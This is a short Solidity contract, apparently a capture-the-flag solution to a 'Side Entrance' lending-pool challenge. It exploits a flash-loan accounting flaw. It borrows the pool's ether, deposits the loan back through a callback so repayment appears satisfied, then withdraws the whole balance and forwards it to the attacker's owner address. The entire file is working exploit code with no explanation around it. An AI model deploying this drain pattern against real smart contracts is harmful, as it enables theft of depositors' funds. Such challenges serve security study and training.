// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() payable external;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntranceLenderPool {
    using Address for address payable;
    address owner;

    IPool public immutable pool;

    constructor(address poolAddress) {
      pool = IPool(poolAddress);
      owner = msg.sender;

    }

    function execute() external payable {
      pool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }
    receive() external payable {
      payable(owner).sendValue(msg.value);
    }
}
